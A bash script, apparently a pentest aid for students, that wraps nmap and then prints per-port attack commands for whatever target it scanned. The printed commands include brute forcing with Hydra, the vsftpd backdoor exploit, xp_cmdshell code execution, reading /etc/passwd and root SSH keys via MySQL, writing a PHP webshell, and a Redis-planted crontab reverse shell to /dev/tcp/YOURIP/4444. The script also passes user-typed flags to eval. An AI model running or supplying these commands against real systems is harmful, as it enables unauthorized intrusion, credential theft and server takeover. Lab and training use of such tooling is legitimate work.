#!/usr/bin/env bash
# bnmap v5.0 - Smart nmap wrapper for cybersecurity students
# Install: sudo rm /usr/local/bin/bnmap && sudo cp bnmap /usr/local/bin/bnmap && sudo chmod +x /usr/local/bin/bnmap

VERSION="5.0"
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
ORANGE='\033[0;33m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

banner() {
  echo -e "${PURPLE}${BOLD}"
  echo "  _____         _  _  _  _  ___  ____  "
  echo " |  __ \       | \| || \| ||   \|  _ \ "
  echo " | |__) |      |  \` ||  \` || () | |_) |"
  echo " |_____/ nmap  |_|\_||_|\_||___/|____/ "
  echo -e "${NC}${DIM}  Smart nmap wrapper v${VERSION} — for cybersecurity students${NC}"
  echo ""
}

usage() {
  echo -e "${BOLD}Usage:${NC} bnmap <target> [extra flags]"
  echo -e "  bnmap 192.168.1.1"
  echo -e "  bnmap 192.168.1.1 -p 80,443,445"
  echo -e "  bnmap 10.10.10.0/24"
  echo ""; exit 1
}

s()   { echo ""; }
warn(){ echo -e "  ${YELLOW}[!]${NC} $1"; }
info(){ echo -e "  ${CYAN}[*]${NC} $1"; }
good(){ echo -e "  ${GREEN}[+]${NC} $1"; }
tip() { echo -e "  ${PURPLE}[>]${NC} $1"; }
cmd() { echo -e "      ${CYAN}$1${NC}"; }
hdr() { echo -e "  ${YELLOW}${BOLD}[ $1 ]${NC}"; }

check_deps() {
  command -v nmap &>/dev/null || { echo "nmap not found: sudo apt install nmap"; exit 1; }
}

analyze_command() {
  local target="$1"; shift
  local flags="$*"
  local score=0
  local missing_flags=()
  local goods=()
  local missing_labels=()

  echo -e "${BOLD}${CYAN}[bnmap] Analyzing your command...${NC}"; s

  echo "$flags" | grep -qE '\-p\-|p 1-65535' \
    && { goods+=("Full port scan (-p-)"); score=$((score+25)); } \
    || { missing_flags+=("-p-"); missing_labels+=("Full port scan — scan all 65535 ports"); }

  echo "$flags" | grep -qE '\-sV|\-A' \
    && { goods+=("Version detection (-sV)"); score=$((score+20)); } \
    || { missing_flags+=("-sV"); missing_labels+=("Version detection — identify software versions"); }

  echo "$flags" | grep -qE '\-sC|\-A' \
    && { goods+=("Default scripts (-sC)"); score=$((score+15)); } \
    || { missing_flags+=("-sC"); missing_labels+=("Default NSE scripts — banner grabs, vuln checks"); }

  echo "$flags" | grep -qE '\-O|\-A' \
    && { goods+=("OS detection (-O)"); score=$((score+10)); } \
    || { missing_flags+=("-O"); missing_labels+=("OS detection — fingerprint the target OS"); }

  echo "$flags" | grep -qE '\-sU' \
    && { goods+=("UDP scan (-sU)"); score=$((score+15)); } \
    || { missing_flags+=("-sU"); missing_labels+=("UDP scan — find SNMP/DNS/TFTP services (needs sudo)"); }

  echo "$flags" | grep -qE '\-T[0-5]' \
    && { goods+=("Timing set"); score=$((score+5)); } \
    || { missing_flags+=("-T4"); missing_labels+=("Timing T4 — faster scan for lab/CTF targets"); }

  echo "$flags" | grep -qE '\-oN|\-oA|\-oX' \
    && { goods+=("Output saving enabled"); score=$((score+10)); } \
    || { missing_flags+=("-oA scan_${target//\//_}"); missing_labels+=("Save output — always save your scan results"); }

  # Print what's good
  for g in "${goods[@]}"; do good "$g"; done
  [ ${#goods[@]} -gt 0 ] && s

  # Show missing flags as numbered menu
  if [ ${#missing_flags[@]} -gt 0 ]; then
    warn "${BOLD}Missing flags detected:${NC}"; s
    for i in "${!missing_flags[@]}"; do
      echo -e "  ${CYAN}[$((i+1))]${NC} ${BOLD}${missing_flags[$i]}${NC}"
      echo -e "      ${DIM}${missing_labels[$i]}${NC}"
    done
    s

    # Score bar
    local bar="" filled=$((score/5))
    for ((i=0;i<20;i++)); do [ $i -lt $filled ] && bar+="█" || bar+="░"; done
    local sc=$RED; [ $score -ge 40 ] && sc=$YELLOW; [ $score -ge 75 ] && sc=$GREEN
    echo -e "  ${BOLD}Scan coverage:${NC} ${sc}${bar} ${score}%${NC}"; s

    echo -e "  ${PURPLE}${BOLD}Options:${NC}"
    echo -e "  ${CYAN}[a]${NC} Add all missing flags (recommended)"
    echo -e "  ${CYAN}[1-${#missing_flags[@]}]${NC} Add specific flags (e.g: 1 3 5)"
    echo -e "  ${CYAN}[c]${NC} Type your own custom flags"
    echo -e "  ${CYAN}[n]${NC} Run as-is with no changes"
    s
    echo -ne "  ${BOLD}Your choice:${NC} "
    read -r choice
    s

    local extra=""

    if [[ "$choice" == "a" ]]; then
      for f in "${missing_flags[@]}"; do extra+=" $f"; done
      good "Adding all: $extra"

    elif [[ "$choice" == "c" ]]; then
      echo -ne "  ${BOLD}Enter your custom flags:${NC} "
      read -r custom
      extra=" $custom"
      good "Using custom flags: $extra"

    elif [[ "$choice" == "n" ]]; then
      good "Running as-is."

    else
      # Parse numbers like "1 3 5"
      for num in $choice; do
        if [[ "$num" =~ ^[0-9]+$ ]]; then
          local idx=$((num-1))
          if [ $idx -ge 0 ] && [ $idx -lt ${#missing_flags[@]} ]; then
            extra+=" ${missing_flags[$idx]}"
          fi
        fi
      done
      [ -n "$extra" ] && good "Adding flags:$extra" || good "No valid selection, running as-is."
    fi

    s
    flags="$flags$extra"
  else
    local bar="" filled=$((score/5))
    for ((i=0;i<20;i++)); do [ $i -lt $filled ] && bar+="█" || bar+="░"; done
    echo -e "  ${BOLD}Scan coverage:${NC} ${GREEN}${bar} ${score}%${NC}"; s
    good "Your command looks solid!"
    s
  fi

  TARGET="$target"
  NMAP_CMD="nmap $flags $target"

  echo -e "  ${PURPLE}${BOLD}[>] Final command:${NC}"
  cmd "$NMAP_CMD"; s
}

run_scan() {
  echo -e "${BOLD}${CYAN}[bnmap] Running scan...${NC}"; s
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  SCAN_OUTPUT=$(eval "$NMAP_CMD" 2>&1 | tee /dev/tty)
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"; s
}

recommend() {
  echo -e "${BOLD}${ORANGE}[bnmap] Recommended next steps:${NC}"; s
  local found=0

  if echo "$SCAN_OUTPUT" | grep -qE '^21/tcp.*open'; then found=1
    hdr "FTP — port 21"
    tip "1. Test anonymous login:"
    cmd "ftp $TARGET   →  Name: anonymous   Password: (blank)"
    tip "2. Brute force credentials:"
    cmd "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://$TARGET -t 4"
    tip "3. Check vsftpd 2.3.4 backdoor (CVE-2011-2523):"
    cmd "searchsploit vsftpd 2.3.4  &&  use exploit/unix/ftp/vsftpd_234_backdoor"
    tip "4. Download everything if anonymous works:"
    cmd "wget -r ftp://anonymous:anonymous@$TARGET/"
    tip "5. NSE scripts:"
    cmd "nmap --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 $TARGET"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^22/tcp.*open'; then found=1
    hdr "SSH — port 22"
    tip "1. Check version for known CVEs:"
    cmd "searchsploit openssh"
    tip "2. Brute force with Hydra:"
    cmd "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4"
    tip "3. Try common default credentials:"
    cmd "ssh root@$TARGET  |  ssh admin@$TARGET  |  ssh user@$TARGET"
    tip "4. Check what auth methods are allowed:"
    cmd "nmap --script ssh-auth-methods --script-args='ssh.user=root' -p 22 $TARGET"
    tip "5. If you have a private key:"
    cmd "chmod 600 id_rsa && ssh -i id_rsa root@$TARGET"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^23/tcp.*open'; then found=1
    hdr "Telnet — port 23"
    tip "1. Connect and try default credentials:"
    cmd "telnet $TARGET"
    tip "2. Brute force:"
    cmd "hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://$TARGET"
    tip "3. Sniff cleartext traffic (if on same network):"
    cmd "tcpdump -i eth0 host $TARGET and port 23 -A"
    tip "4. NSE scripts:"
    cmd "nmap --script telnet-ntlm-info,telnet-encryption -p 23 $TARGET"
    tip "5. Metasploit scanner:"
    cmd "use auxiliary/scanner/telnet/telnet_login  →  set RHOSTS $TARGET  →  run"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^25/tcp.*open|^587/tcp.*open'; then found=1
    hdr "SMTP — port 25/587"
    tip "1. Grab banner and test VRFY:"
    cmd "nc -nv $TARGET 25  →  VRFY root  →  VRFY admin"
    tip "2. Enumerate valid users:"
    cmd "smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET"
    tip "3. Test for open relay:"
    cmd "swaks --to victim@example.com --from attacker@evil.com --server $TARGET"
    tip "4. NSE scripts:"
    cmd "nmap --script smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 -p 25 $TARGET"
    tip "5. Metasploit enum:"
    cmd "use auxiliary/scanner/smtp/smtp_enum  →  set RHOSTS $TARGET  →  run"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^53/tcp.*open|^53/udp.*open'; then found=1
    hdr "DNS — port 53"
    tip "1. Zone transfer attempt:"
    cmd "dig axfr @$TARGET target.com"
    tip "2. Reverse lookup:"
    cmd "dig -x $TARGET @$TARGET"
    tip "3. Subdomain brute force:"
    cmd "gobuster dns -d target.com -r $TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
    tip "4. DNSrecon full scan:"
    cmd "dnsrecon -d target.com -t axfr,brt,std -n $TARGET"
    tip "5. NSE scripts:"
    cmd "nmap --script dns-zone-transfer,dns-brute,dns-cache-snoop -p 53 $TARGET"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^80/tcp.*open|^8080/tcp.*open|^8000/tcp.*open|^8888/tcp.*open'; then found=1
    local hp; hp=$(echo "$SCAN_OUTPUT" | grep -oE '^(80|8080|8000|8888)/tcp' | head -1 | cut -d/ -f1)
    hdr "HTTP — port $hp"
    tip "1. Directory brute force:"
    cmd "gobuster dir -u http://$TARGET:$hp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 50"
    tip "2. Recursive brute with feroxbuster:"
    cmd "feroxbuster -u http://$TARGET:$hp -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html"
    tip "3. Vulnerability scan:"
    cmd "nikto -h http://$TARGET:$hp -C all"
    tip "4. Parameter fuzzing:"
    cmd "ffuf -u http://$TARGET:$hp/FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
    tip "5. NSE web scripts:"
    cmd "nmap --script http-enum,http-shellshock,http-sql-injection -p $hp $TARGET"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^443/tcp.*open|^8443/tcp.*open'; then found=1
    local sp; sp=$(echo "$SCAN_OUTPUT" | grep -oE '^(443|8443)/tcp' | head -1 | cut -d/ -f1)
    hdr "HTTPS — port $sp"
    tip "1. Check SSL/TLS for Heartbleed, POODLE, weak ciphers:"
    cmd "sslscan $TARGET:$sp  |  testssl.sh $TARGET:$sp"
    tip "2. Extract cert info — find hostnames and emails:"
    cmd "openssl s_client -connect $TARGET:$sp 2>/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'"
    tip "3. Directory brute over HTTPS:"
    cmd "gobuster dir -u https://$TARGET:$sp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,html,txt -t 50"
    tip "4. NSE SSL vuln scripts:"
    cmd "nmap --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params -p $sp $TARGET"
    tip "5. Nikto over HTTPS:"
    cmd "nikto -h https://$TARGET:$sp -ssl -C all"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^139/tcp.*open|^445/tcp.*open'; then found=1
    hdr "SMB — port 139/445"
    tip "1. Full enumeration:"
    cmd "enum4linux -a $TARGET"
    tip "2. List shares and permissions:"
    cmd "smbmap -H $TARGET  |  smbclient -L //$TARGET -N"
    tip "3. Check EternalBlue (MS17-010):"
    cmd "nmap --script smb-vuln-ms17-010,smb-vuln-cve-2017-7494 -p 445 $TARGET"
    tip "4. Connect to a share:"
    cmd "smbclient //$TARGET/SHARENAME -N  →  dir  →  get filename"
    tip "5. CrackMapExec password spray:"
    cmd "crackmapexec smb $TARGET -u users.txt -p passwords.txt"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^389/tcp.*open|^636/tcp.*open'; then found=1
    hdr "LDAP — port 389/636"
    tip "1. Anonymous enumeration:"
    cmd "ldapsearch -x -H ldap://$TARGET -b 'dc=domain,dc=com'"
    tip "2. Find naming contexts:"
    cmd "ldapsearch -x -H ldap://$TARGET -b '' -s base namingContexts"
    tip "3. Enumerate AD users:"
    cmd "ldapsearch -x -H ldap://$TARGET -b 'dc=domain,dc=com' '(objectClass=user)' sAMAccountName"
    tip "4. NSE scripts:"
    cmd "nmap --script ldap-rootdse,ldap-search -p 389 $TARGET"
    tip "5. BloodHound collection:"
    cmd "bloodhound-python -u user -p pass -ns $TARGET -d domain.com -c all"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^1433/tcp.*open'; then found=1
    hdr "MSSQL — port 1433"
    tip "1. Connect with impacket:"
    cmd "mssqlclient.py sa@$TARGET  |  mssqlclient.py sa:''@$TARGET"
    tip "2. Brute force:"
    cmd "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://$TARGET"
    tip "3. NSE scripts:"
    cmd "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-config -p 1433 $TARGET"
    tip "4. Enable xp_cmdshell for RCE:"
    cmd "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
    tip "5. Run OS commands:"
    cmd "EXEC xp_cmdshell 'whoami';  |  EXEC xp_cmdshell 'net user';"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^3306/tcp.*open'; then found=1
    hdr "MySQL — port 3306"
    tip "1. Try root with no password:"
    cmd "mysql -u root -h $TARGET"
    tip "2. Brute force:"
    cmd "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$TARGET"
    tip "3. NSE scripts:"
    cmd "nmap --script mysql-empty-password,mysql-info,mysql-databases -p 3306 $TARGET"
    tip "4. Read sensitive files:"
    cmd "SELECT load_file('/etc/passwd');  |  SELECT load_file('/root/.ssh/id_rsa');"
    tip "5. Write webshell:"
    cmd "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^3389/tcp.*open'; then found=1
    hdr "RDP — port 3389"
    tip "1. Check BlueKeep (CVE-2019-0708):"
    cmd "nmap --script rdp-vuln-ms12-020 -p 3389 $TARGET"
    tip "2. Brute force:"
    cmd "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$TARGET -t 4"
    tip "3. Connect with known creds:"
    cmd "xfreerdp /u:administrator /p:'Password123' /v:$TARGET /cert-ignore"
    tip "4. Password spray:"
    cmd "crackmapexec rdp $TARGET -u users.txt -p passwords.txt"
    tip "5. Check encryption:"
    cmd "nmap --script rdp-enum-encryption -p 3389 $TARGET"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^5985/tcp.*open|^5986/tcp.*open'; then found=1
    hdr "WinRM — port 5985/5986"
    tip "1. Connect with creds:"
    cmd "evil-winrm -i $TARGET -u administrator -p 'Password123'"
    tip "2. Pass-the-hash:"
    cmd "evil-winrm -i $TARGET -u administrator -H <NTLM_HASH>"
    tip "3. Password spray:"
    cmd "crackmapexec winrm $TARGET -u users.txt -p passwords.txt"
    tip "4. Test accessibility:"
    cmd "curl -s http://$TARGET:5985/wsman"
    tip "5. Metasploit login scanner:"
    cmd "use auxiliary/scanner/winrm/winrm_login  →  set RHOSTS $TARGET  →  run"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^6379/tcp.*open'; then found=1
    hdr "Redis — port 6379"
    tip "1. Connect and dump info:"
    cmd "redis-cli -h $TARGET  →  info  →  keys '*'"
    tip "2. Check writable paths:"
    cmd "redis-cli -h $TARGET config get dir  |  config get dbfilename"
    tip "3. Write SSH key (root takeover):"
    cmd "redis-cli -h $TARGET config set dir /root/.ssh/ && config set dbfilename authorized_keys && set x '\\nssh-rsa YOURKEY\\n' && save"
    tip "4. Write reverse shell crontab:"
    cmd "redis-cli -h $TARGET config set dir /var/spool/cron/ && config set dbfilename root && set x '\\n* * * * * bash -i >& /dev/tcp/YOURIP/4444 0>&1\\n' && save"
    tip "5. NSE script:"
    cmd "nmap --script redis-info -p 6379 $TARGET"
    s
  fi

  if echo "$SCAN_OUTPUT" | grep -qE '^27017/tcp.*open'; then found=1
    hdr "MongoDB — port 27017"
    tip "1. Connect unauthenticated:"
    cmd "mongo --host $TARGET --port 27017"
    tip "2. List and dump databases:"
    cmd "show dbs;  use <db>;  show collections;  db.<col>.find();"
    tip "3. Dump entire DB:"
    cmd "mongodump --host $TARGET --port 27017 --out ./dump_$TARGET"
    tip "4. NSE scripts:"
    cmd "nmap --script mongodb-info,mongodb-databases,mongodb-brute -p 27017 $TARGET"
    tip "5. Check admin access:"
    cmd "mongo --host $TARGET --eval 'db.runCommand({listDatabases:1})' admin"
    s
  fi

  # Unknown ports
  local known="21 22 23 25 53 80 139 389 443 445 587 636 1433 3306 3389 5985 5986 6379 8000 8080 8443 8888 27017"
  while IFS= read -r line; do
    local p; p=$(echo "$line" | grep -oE '^[0-9]+' | head -1)
    local svc; svc=$(echo "$line" | awk '{print $3}')
    if [ -n "$p" ] && ! echo "$known" | grep -qw "$p"; then
      found=1
      hdr "Unknown — port $p ($svc)"
      tip "1. Search for public exploits:"
      cmd "searchsploit $svc"
      tip "2. Grab the service banner:"
      cmd "nc -nv $TARGET $p  |  curl -v telnet://$TARGET:$p"
      tip "3. NSE vuln scan:"
      cmd "nmap --script banner,vulners -p $p $TARGET"
      tip "4. Check Exploit-DB online:"
      cmd "https://www.exploit-db.com/search?q=$svc"
      tip "5. Metasploit scanner:"
      cmd "use auxiliary/scanner/portscan/tcp  →  set PORTS $p  →  set RHOSTS $TARGET  →  run"
      s
    fi
  done < <(echo "$SCAN_OUTPUT" | grep -E '^[0-9]+/tcp.*open')

  [ $found -eq 0 ] && { warn "No open ports found."; tip "Try: bnmap $TARGET -p- -sV -T4"; s; }
}

save_report() {
  local f="bnmap_${TARGET//\//_}_$(date +%Y%m%d_%H%M%S).txt"
  { echo "bnmap report — $(date)"; echo "Target: $TARGET"; echo "Command: $NMAP_CMD"
    echo "================================"; echo "$SCAN_OUTPUT"; } > "$f"
  good "Report saved: $f"; s
}

main() {
  banner; check_deps
  [ $# -lt 1 ] && usage
  local target="$1"; shift; local flags="$*"
  analyze_command "$target" "$flags"
  run_scan
  recommend
  save_report
  echo -e "${GREEN}${BOLD}[bnmap] Done. Happy hacking.${NC}"
}

main "$@"
